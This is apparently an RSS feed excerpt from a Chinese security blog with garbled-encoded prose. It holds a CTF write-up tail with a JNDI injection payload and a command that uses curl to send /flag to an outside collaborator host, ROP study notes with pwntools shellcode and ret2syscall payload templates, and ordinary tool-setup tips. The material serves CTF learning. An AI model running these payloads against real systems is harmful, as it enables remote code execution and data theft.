&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210803004021941.png" alt="image-20210803004021941">&lt;/p>
&lt;p>å…‰çœ‹åˆ°phpinfoä¸æ˜¯ç›®æ ‡ï¼Œè¿˜éœ€è¦ç»§ç»­æ‰§è¡Œå‘½ä»¤ï¼Œè¿™é‡Œç”¨çš„æ˜¯ç¬¬äºŒä¸ªé“¾å­ ç›¸å½“äºŽæ‰§è¡Œä»¥ä¸‹çš„å‘½ä»¤&lt;/p>
&lt;pre tabindex="0">&lt;code>system(&amp;quot;cd ../../../;ls&amp;quot;);
system(&amp;quot;cd ../../../;cat flag&amp;quot;);
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210803122653978.png" alt="image-20210803122653978">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210803122933503.png" alt="image-20210803122933503">&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://guokeya.github.io/post/z5gHcmbVj/">wp1&lt;/a> &lt;a href="https://vuln.top/2021/05/08/16204457586099/">wp2&lt;/a>&lt;/p>
&lt;p>â€”â€”â€”â€”å“„å ‚å¤§å­äº†å®¶äººä»¬ æˆ‘æ˜¯æ†¨æ‰¹ è¿™ä¸ªgetä¼ imageçš„åœ°æ–¹æˆ‘ä¸€ç›´åœ¨ç”¨postä¼  æˆ‘è¿˜åœ¨çº³é—·ä¸ºå•¥ä¸€ç›´ä¼šæŠ¥405çš„é”™ðŸ˜…ðŸ˜…ðŸ˜…&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[NPUCTF2020]EzShiro
&lt;/h4>
&lt;/summary>
&lt;p>å’Œ [çº¢æ˜Žè°·CTF 2021]JavaWeb æ˜¯å®Œå…¨ä¸€æ ·çš„payload&lt;/p>
&lt;p>é¦–å…ˆæ˜¯ä¸€ä¸ª/;/jsonç»•è¿‡é‰´æƒï¼Œä¹‹åŽæ˜¯jndiæ³¨å…¥ï¼Œç”¨é‚£ä¸ªjarä¸€æŠŠæ¢­&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;ch.qos.logback.core.db.JNDIConnectionSource&amp;#34;&lt;/span>&lt;span style="color:#111">,{&lt;/span>&lt;span style="color:#f92672">&amp;#34;jndiLocation&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;rmi://101.35.114.107:1099/qhx0ip&amp;#34;&lt;/span>&lt;span style="color:#111">}]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &lt;span style="color:#d88200">&amp;#34;curl http://mg6uynla2pxa8ilgp4cprm0suj09oy.burpcollaborator.net/ -F file=@/flag&amp;#34;&lt;/span> -A &lt;span style="color:#d88200">&amp;#34;101.35.114.107&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/details></description></item><item><title>pwn ropå…¥é—¨-å­¦ä¹ ç¬”è®°</title><link>https://amiaaaz.github.io/2022/01/18/pwn-rop-study-notes/</link><pubDate>Tue, 18 Jan 2022 00:00:14 +0800</pubDate><guid>https://amiaaaz.github.io/2022/01/18/pwn-rop-study-notes/</guid><description>&lt;h1 id="rop">ROP&lt;/h1>
&lt;p>return oriented programming&lt;/p>
&lt;h2 id="ç®€å•çš„æ±‡ç¼–æŒ‡ä»¤">ç®€å•çš„æ±‡ç¼–æŒ‡ä»¤&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>ret -&amp;gt; pop EIP (ESPå¢žå¤§)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>leave -&amp;gt; move ESP, EBP; pop EBP&lt;/p>
&lt;/li>
&lt;li>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>intel&lt;/th>
&lt;th>AT&amp;amp;T&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>mov eax, 8&lt;/td>
&lt;td>movl $8, %eax&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>mov ebx, 0ffffh&lt;/td>
&lt;td>movl $0xffff, %ebx&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>int 80h&lt;/td>
&lt;td>int $80&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>mov eax, [ecx]&lt;/td>
&lt;td>movl (%ecx), %eax&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/li>
&lt;/ul>
&lt;h2 id="å‡ ç§é˜²æŠ¤æŽªæ–½">å‡ ç§é˜²æŠ¤æŽªæ–½&lt;/h2>
&lt;ul>
&lt;li>canary: éšæœºå€¼é˜²æ­¢æ ˆæº¢å‡º (cookie)&lt;/li>
&lt;li>ASLR: å…¨å±€ç³»ç»Ÿå˜é‡&lt;code>/proc/sys/kernel/randomize_va_space&lt;/code>ï¼Œå†…å­˜åœ°å€éšæœºåŒ–ï¼Œè€Œgdbè°ƒè¯•ä¸­ä¸ºå…³é—­çŠ¶æ€&lt;/li>
&lt;li>PIE: å†…å­˜åœ°å€éšæœºåŒ–&lt;/li>
&lt;li>NX: æ•°æ®ä¸å¯æ‰§è¡Œ&lt;/li>
&lt;/ul>
&lt;h2 id="ret2text">ret2text&lt;/h2>
&lt;p>åœ¨ä»£ç æ®µ.textå­˜åœ¨åŽé—¨å‡½æ•°ï¼Œå°†ret addressä¿®æ”¹ä¸ºåŽé—¨å‡½æ•°çš„åœ°å€æŽ§åˆ¶å‡½æ•°çš„æ‰§è¡Œ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cyclic&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">p32&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys_addr&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># n: ebp-eax+4(or 8), p32 or p64&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="ret2shellcode">ret2shellcode&lt;/h2>
&lt;p>å­˜åœ¨rwxä»£ç ç‰‡æ®µï¼Œä¼ å…¥shellcodeå¹¶ä¿®æ”¹ret addressä¸ºshellcodeæ‰€åœ¨çš„ç¼“å†²åŒºåœ°å€&lt;/p>
&lt;p>NXä¸å¼€å¯æ—¶ç›´æŽ¥å†™å…¥æ ˆç¼“å†²åŒºï¼Œå¼€å¯æ—¶å‘bssç¼“å†²åŒºæˆ–å †ç¼“å†²åŒºå†™å…¥shellcodeå¹¶ä½¿ç”¨mprotectèµ‹äºˆå¯æ‰§è¡Œæƒé™&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;a href="http://shell-storm.org/shellcode/">shellcode&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">pwn&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;span style="color:#111">shellcraft&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sh&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">shellcraft&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">amd64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sh&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#75715e"># before: context.arch = &amp;#39;amd64&amp;#39;!&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">asm&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcraft&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sh&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ljust&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">p32&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sh_addr&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="ret2syscall">ret2syscall&lt;/h2>
&lt;p>å­˜åœ¨&lt;code>/bin/sh&lt;/code>æˆ–&lt;code>sh&lt;/code>å­—ç¬¦ä¸²ï¼Œæž„é€ gadgetså¤šæ¬¡è·³è½¬ret addræ¥æ‰§è¡Œ&lt;code>execve&lt;/code>ç³»ç»Ÿè°ƒç”¨ï¼›gadgetsé€šè¿‡&lt;code>ROPgadget&lt;/code>å¯»æ‰¾&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">ROPgadget --binary filename_here --only &lt;span style="color:#d88200">&amp;#39;pop|ret&amp;#39;&lt;/span> &lt;span style="color:#111">|&lt;/span> grep &lt;span style="color:#d88200">&amp;#39;ebx&amp;#39;&lt;/span>
ROPgadget --binary filename_here --string &lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>
ROPgadget --binary rop --only &lt;span style="color:#d88200">&amp;#39;int&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ•´ä½“çš„payloadæž„é€ ä¸Žå‡½æ•°è°ƒç”¨æ ˆçš„å·¥ä½œåŽŸç†å’Œç³»ç»Ÿè°ƒç”¨çš„å®žçŽ°æœ‰å…³ï¼Œx86ä¸‹é€šè¿‡&lt;code>int 0x80&lt;/code>æ‰§è¡Œï¼Œamd64ä¸‹ä¸º&lt;code>syscall&lt;/code>ï¼›æ³¨æ„å‚æ•°ä¼ å…¥çš„é¡ºåº (1-&amp;gt;N) ä¸Žæ ˆä¸­å­˜æ”¾çš„é¡ºåº (N-&amp;gt;1)çš„åŒºåˆ«&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">flat&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cyclic&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">pop_eax_ret&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0xb&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pop_edx_ecx_ebx_ret&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">bin_sh_addr&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">int80_addr&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># 0xb: execveçš„ç³»ç»Ÿè°ƒç”¨å· 11, execve(&amp;#34;/bin/sh&amp;#34;, NULL, NULL)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>_Refer: &lt;a href="https://en.wikipedia.org/wiki/System_call">System call&lt;/a>&lt;/p>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æŽ¥ðŸ”— æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ
&lt;/h4>
&lt;/summary>
&lt;ul>
&lt;li>
&lt;p>&lt;a href="https://www.bilibili.com/video/BV1854y1y7Ro">XMCVE 2020 CTF Pwnå…¥é—¨è¯¾ç¨‹&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/">ctfwiki - Stack Overflow&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://www.yuque.com/hxfqg9/bin/zzg02e">è’¸ç±³ROP&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://github.com/Vancir/365-days-get-xuanwulab-job/blob/master/weeks/week1.md">365-days-get-xuanwulab-job/weeks/week1.md&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="http://www.cnblogs.com/clover-toeic/p/3755401.html">C è¯­è¨€å‡½æ•°è°ƒç”¨æ ˆ (ä¸€)&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="http://www.cnblogs.com/clover-toeic/p/3756668.html">C è¯­è¨€å‡½æ•°è°ƒç”¨æ ˆ (äºŒ)&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://www.cnblogs.com/clover-toeic/p/3757091.html">C è¯­è¨€å‡½æ•°è°ƒç”¨æ ˆ (äºŒ)&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://en.wikipedia.org/wiki/System_call">System call&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/details></description></item><item><title>æ— é¢˜</title><link>https://amiaaaz.github.io/2022/01/13/maybe-help-someone/</link><pubDate>Thu, 13 Jan 2022 10:58:56 +0800</pubDate><guid>https://amiaaaz.github.io/2022/01/13/maybe-help-someone/</guid><description>&lt;details>
&lt;summary>
&lt;h4 class="inline">
æœ¬åœ°æ­å»ºVisual Regexp
&lt;/h4>
&lt;/summary>
&lt;p>æ­å»ºåŽŸå› å¤§å®¶åº”è¯¥éƒ½æ‡‚å§ï¼Œä¸€ä¸ªæ˜¯æ­£åˆ™å¯è§†åŒ–å®žåœ¨æ˜¯å¾ˆé¦™å¾ˆå¿…è¦ï¼Œå…¶æ¬¡çº¿ä¸‹æ²¡ç½‘çš„è¯æ²¡æœ‰ä¸ªç¦»çº¿å·¥å…·å°±å¾ˆå®¹æ˜“ggï¼ŒåŒç±»å·¥å…·è¿˜æœ‰&lt;a href="https://github.com/gchq/CyberChef/releases/tag/v9.32.3">cyberchef&lt;/a>ç­‰&lt;/p>
&lt;p>&lt;a href="https://wangwl.net/static/projects/visualRegex/#">Visual Regexpåœ¨çº¿åœ°å€&lt;/a> | &lt;a href="https://github.com/relax-code-relax-life/visualRegexPage">githubä»“åº“&lt;/a>&lt;/p>
&lt;p>åœ¨&lt;code>git clone&lt;/code>ä¹‹åŽé¦–å…ˆè‚¯å®šæ˜¯&lt;code>npm install&lt;/code>ï¼Œå‡ºçŽ°vulnerabilitieså¾ˆæ­£å¸¸ï¼Œç›´æŽ¥&lt;code>npm audit fix --force&lt;/code>ï¼Œä¸€æ¬¡ä¸è¡Œå°±ä¸¤æ¬¡&lt;/p>
&lt;p>å¥‡è‘©çš„æ˜¯ä½œè€…è‡ªå·±çš„visual-regexåŒ…ä¸€ç›´æ˜¯ä»¥å¿«æ·æ–¹å¼çš„å½¢å¼è¢«å®‰è£…ï¼ˆåŽæ¥å‘çŽ°æ˜¯æ•´ä¸ªé¡¹ç›®çš„package.jsonç¼–å†™çš„é—®é¢˜ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114182010887.png" alt="image-20211114182010887">&lt;/p>
&lt;p>è§£å†³æ–¹æ³•ï¼šåˆ é™¤å¿«æ·æ–¹å¼ï¼Œå•ç‹¬å®‰è£…&lt;code>npm i visual-regex&lt;/code>ï¼Œç”¨everythingæŸ¥æ‰¾åˆ°è¯¥åŒ…å…·ä½“å­˜åœ¨çš„ä½ç½®ï¼Œå¤åˆ¶åˆ°node_modulesç›®å½•ä¸‹&lt;/p>
&lt;p>ä¹‹åŽåˆ°buildç›®å½•ä¸‹&lt;code>node .\build.js&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114182307150.png" alt="image-20211114182307150">&lt;/p>
&lt;p>æŠ¥é”™hightlight.jså¹¶æ²¡æœ‰å¼•å…¥./lib/highlightï¼ŒæŸ¥çœ‹\highlight.js\package.jsonçš„exportséƒ¨åˆ†ï¼Œå‘çŽ°ç¬¬90è¡Œçš„å¼•ç”¨æ˜¯&amp;quot;.&amp;quot;ï¼Œå°†å…¶æ”¹ä¸º&amp;quot;./lib/highlight&amp;quot;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/JQW8B657%60%241JG%5BFOWY1I%7BBW.png" alt="img">&lt;/p>
&lt;p>å†æ¬¡buildæç¤º*&amp;lsquo;NODE_ENV&amp;rsquo; is not recognized as an internal or external command, operable program or batch file.*ï¼ˆæ­¤å¤„æˆªå›¾èµ°ä¸¢äº†ï¼‰ï¼Œè§£å†³æ–¹æ³•&lt;code>npm install -g win-node-env&lt;/code>&lt;/p>
&lt;p>ä¹‹åŽ&lt;code>node .\build.js&lt;/code>å³å¯æˆåŠŸbuildï¼Œåœ¨devlistæ–‡ä»¶å¤¹ä¸‹çš„index.htmlå³å¯æ­£å¸¸ä½¿ç”¨ç›¸å…³åŠŸèƒ½&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ— æ³•æ‰“å¼€jaråŒ…åº”ç”¨
&lt;/h4>
&lt;/summary>
&lt;p>è¿™ä¸ªåº”è¯¥å±žäºŽå¸¸è§é—®é¢˜äº†ï¼Œä¸€èˆ¬åŽŸå› æ˜¯javaç‰ˆæœ¬ä¸å¯¹&lt;/p>
&lt;p>å¾ˆå¤šäººé€‰æ‹©è®¾ç½®ä¸åŒåå­—çš„çŽ¯å¢ƒå˜é‡ï¼Œæ¯”å¦‚java8ï¼Œjava11ï¼Œæˆ‘çš„è¯æ˜¯åªæœ‰java11æ˜¯çŽ¯å¢ƒå˜é‡ï¼Œåœ¨æœ‰äº›jaréœ€è¦java8çš„çŽ¯å¢ƒæ—¶ç›´æŽ¥ç”¨everythingæœç´¢java.exeï¼Œå¤åˆ¶è·¯å¾„ä¹‹åŽ&lt;code>xxx\java.exe -jar xyz.jar&lt;/code>è¿™æ ·æ¥è¿è¡Œ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211117132839594.png" alt="image-20211117132839594">&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
è¿œç¨‹è°ƒè¯•Node.js
&lt;/h4>
&lt;/summary>
&lt;p>åœºæ™¯ï¼šç”¨vulhubæˆ–å…¶å®ƒå·²ç»æ‰“åŒ…å¥½çš„dockerçŽ¯å¢ƒå¤çŽ°cveéœ€è¦è¿œç¨‹è°ƒè¯•&lt;/p>
&lt;p>é¦–å…ˆä¿®æ”¹å¯¹åº”çš„dockeræ–‡ä»¶ï¼špackage.jsonçš„&amp;quot;scripts&amp;quot;å­—æ®µçš„&amp;quot;start&amp;quot;éƒ¨åˆ†å¢žåŠ &lt;code>--inspect=0.0.0.0:port&lt;/code>ï¼ŒæŒ‡åè°ƒè¯•æ—¶çš„ç›‘å¬ç«¯å£&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211117160017724.png" alt="image-20211117160017724">&lt;/p>
&lt;p>docker-compose.ymlä¸­å¢žåŠ ç›‘å¬ç«¯å£&amp;quot;8000:9229&amp;quot;ï¼Œä¹‹åŽæ­£å¸¸&lt;code>docker-compose up -d&lt;/code>&lt;/p>
&lt;p>æœ¬åœ°å…ˆä¸‹è½½å¥½ä¸€æ ·çš„æ–‡ä»¶ï¼Œç”¨vscodeç”Ÿæˆä¸€ä¸ªè°ƒè¯•æ–‡æ¡£lauch.json&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211117155743006.png" alt="image-20211117155743006">&lt;/p>
&lt;p>éœ€è¦æ”¹çš„é…ç½®æœ‰addressï¼ˆè¿œç¨‹ipï¼‰ï¼Œportï¼ˆè¿œç¨‹ç›‘å¬ç«¯å£ï¼‰ï¼ŒlocalRootï¼ˆæœ¬åœ°è·¯å¾„ï¼‰ï¼Œremoteï¼ˆè¿œç¨‹è·¯å¾„ï¼‰ï¼Œä¹‹åŽå³å¯æ‰“æ–­ç‚¹è°ƒè¯•&lt;/p>
&lt;p>å‡ºçŽ°unbound breakpointæ­£å¸¸ï¼Œå¤§æ¦‚çŽ‡æ˜¯ä½ çš„äº¤äº’å°±æ²¡æ‰§è¡Œåˆ°æ‰“æ–­ç‚¹çš„åœ°æ–¹ï¼Œæ‰€ä»¥æ²¡ä»€ä¹ˆååº”&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
VirtualBoxç»™è™šæ‹Ÿæœºç£ç›˜æ‰©å®¹
&lt;/h4>
&lt;/summary>
&lt;p>å½“åˆç»™kaliåªåˆ†é…äº†16Gï¼ˆæ— å¥ˆå•Šï¼Œè°è®©æˆ‘ä¸»æœºä¹Ÿå°±512ï¼Œå¾—çœç€ç”¨ï¼‰ï¼Œå¯¼è‡´ä»Šå¤©pipä¸€ä¸ªåŒ…éƒ½å¤±è´¥&lt;/p>
&lt;p>ä¹‹åŽæˆ‘ç›´æŽ¥ç”¨è‡ªå¸¦çš„ä¸»æœºä»‹è´¨ç®¡ç†å™¨å¢žåŠ ç›˜ç‰‡çš„å¤§å°&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220113110156096.png" alt="image-20220113110156096">&lt;/p>
&lt;p>å½“æˆ‘æŠŠä¸‹é¢æ˜¾ç¤ºå¤§å°çš„æ¡æ»‘åˆ°24Gçš„æ—¶å€™æˆ‘è§‰å¾—ç¨³äº†ï¼Œè¿™è¿˜èƒ½ä¸å¤Ÿç”¨ï¼Ÿï¼Ÿï¼ŸäºŽæ˜¯è‡ªä¿¡å¼€æœº&lt;/p>
&lt;p>ç¬‘æ­»ï¼ŒGPartedæ²¡è¯†åˆ«å‡ºæ¥ï¼Œ&lt;code>df -h&lt;/code>ä¹Ÿå®Œå…¨æ²¡å˜åŒ–ï¼Œæˆ‘å°±åˆå¤šåˆ†é…äº†4Gï¼Œç»“æžœè£‚å¼€ï¼Œè¿˜æ˜¯æ²¡è¯†åˆ«&lt;/p>
&lt;p>ç„¶åŽæˆ‘å‘çŽ°é—®é¢˜åœ¨äºŽå¿«ç…§çš„å­˜å‚¨æ˜¯å•ç‹¬æœ‰ä¸€ä¸ªuuidçš„vdiçš„ï¼Œè€Œæ‰©å®¹æ—¶æˆ‘é€‰æ‹©åœ¨æœ€ä¸Šå±‚çš„kali.vdiæ‰©å®¹ï¼Œå¯¼è‡´ä¸ä¼šåŒæ­¥åˆ°ä¸‹é¢çš„å¿«ç…§çš„å­˜å‚¨ä¿¡æ¯&lt;/p>
&lt;p>è§£å†³æ–¹æ³•å°±æ˜¯æŠŠå‰é¢æ‰€æœ‰çš„å¿«ç…§åˆ é™¤æŽ‰ï¼Œä¹‹åŽå†å¼€æœºå°±å¯ä»¥è¯†åˆ«äº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220113112010762.png" alt="image-20220113112010762">&lt;/p>
&lt;p>ç”±äºŽæœªåˆ†é…å’Œ/dev/sda1ä¹‹é—´éš”ç€æ‰©å±•åˆ†åŒºå’Œswapï¼Œæ‰€ä»¥å…ˆåˆ é™¤è¿™ä¸¤ä¸ªï¼Œæ‰©å®¹åŽå†æ–°å»ºåŠ å›žæ¥&lt;/p>
&lt;p>åº”ç”¨ä¿®æ”¹ä¹‹åŽè‡ªä¿¡å¼€æœºï¼Œå‘çŽ°æ€Žä¹ˆkaliçš„é¾™åŠå¤©éƒ½ä¸è“â€¦â€¦ ä¸€ç•ªæŽ’é”™ï¼Œä¹‹åŽå‘çŽ°æ˜¯å› ä¸ºswapåˆ†åŒºçš„uuidå‘ç”Ÿæ”¹å˜å¯¼è‡´swapæ²¡æœ‰æ­£å¸¸æŒ‚è½½ï¼ˆ&lt;code>swapon --show&lt;/code>å›žæ˜¾ä¸ºç©ºï¼‰&lt;/p>
&lt;p>è¾“å…¥&lt;code>blkid&lt;/code>å¤åˆ¶/dev/sda5çš„uuidï¼Œå°†å…¶å¤åˆ¶ç²˜è´´åˆ°/etc/fstabçš„å¯¹åº”ä½ç½®ï¼Œå°±å¥½å•¦&lt;/p>
&lt;/details></description></item><item><title>PHPè¿œç¨‹debugçŽ¯å¢ƒé…ç½®</title><link>https://amiaaaz.github.io/2021/11/25/php-remote-debug-env-init/</link><pubDate>Thu, 25 Nov 2021 18:44:34 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/25/php-remote-debug-env-init/</guid><description>&lt;p>é¦–å…ˆï¼Œè¿™é‡Œçš„æƒ…å†µä¸Žä¸€èˆ¬çš„æœ¬åœ°è°ƒè¯•localhostä¸åŒï¼Œæ˜¯æœ¬åœ°debugè¿œç¨‹ä¸»æœºçš„dockeå†…çš„phpé¡¹ç›®ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œçš„laravelï¼›å¯èƒ½æœ‰çš„äººè§‰å¾—å¤šæ­¤ä¸€ä¸¾ï¼Œç›´æŽ¥åœ¨æœ¬åœ°æ­å»ºé¡¹ç›®ã€è¿è¡Œã€debugä¸€æ°”å‘µæˆï¼Œé€Ÿåº¦è¿˜å¿«ï¼Œä½•å¿…åˆ°è¿œç¨‹è·‘ä¸€é€šï¼Ÿé‚£æˆ‘åªèƒ½è¯´too youngï¼Œå¹´è½»äººè¿˜æ˜¯è¦æœ‰ç‚¹é•¿è¿œçš„æ‰“ç®—ï¼ˆ&lt;/p>
&lt;p>ä¸€åˆ‡çš„èµ·å› æ˜¯æˆ‘æƒ³å¤çŽ°cve-2021-3129ï¼Œé¡ºä¾¿äº²è‡ªåŠ¨æ‰‹è·Ÿä¸€è·Ÿ&amp;amp;æŒ–ä¸€æŒ–laravelæ¡†æž¶ååºåˆ—åŒ–çš„é“¾å­ï¼Œç»“æžœä»£ç å®¡è®¡ä¹‹å‰å…ˆè¢«çŽ¯å¢ƒé…ç½®å›°ä½äº†ï¼›è¢«è¿™ä¸ªç³Ÿå¿ƒçš„è°ƒè¯•ä»Žå‘¨äºŒä¸‹åˆæŠ˜ç£¨åˆ°å‘¨å››çš„å‡Œæ™¨ï¼Œå‡ ä¹Žæ˜¯æŠŠèƒ½è¸©çš„å‘è¸©äº†ä¸ªéï¼ˆç—›è‹¦é¢å…·ï¼‰ï¼Œç›´åˆ°çŽ°åœ¨çš„è§£å†³æ–¹æ¡ˆä¹Ÿä¸èƒ½ç®—æ˜¯æœ€ä¼˜è§£ï¼Œä¸è¿‡æ˜¯èƒ½æ­£å¸¸ç¨³å®šçš„è·‘èµ·æ¥äº†ï¼Œæ¬¡ä¼˜è§£ï¼›æ„Ÿè°¢portainerè®©æˆ‘èƒ½è½»æ¾åˆ›å»ºdocker&lt;/p>
&lt;p>æŠŠè¯¦ç»†çš„æ­¥éª¤è®°å½•åˆ°è¿™ç¯‡åšå®¢é‡Œï¼Œå¸Œæœ›å¯ä»¥å¸®åŠ©åˆ°çœ‹åˆ°çš„äºº~æ¬¢è¿Žå‹å¥½äº¤æµï¼&lt;/p>
&lt;hr>
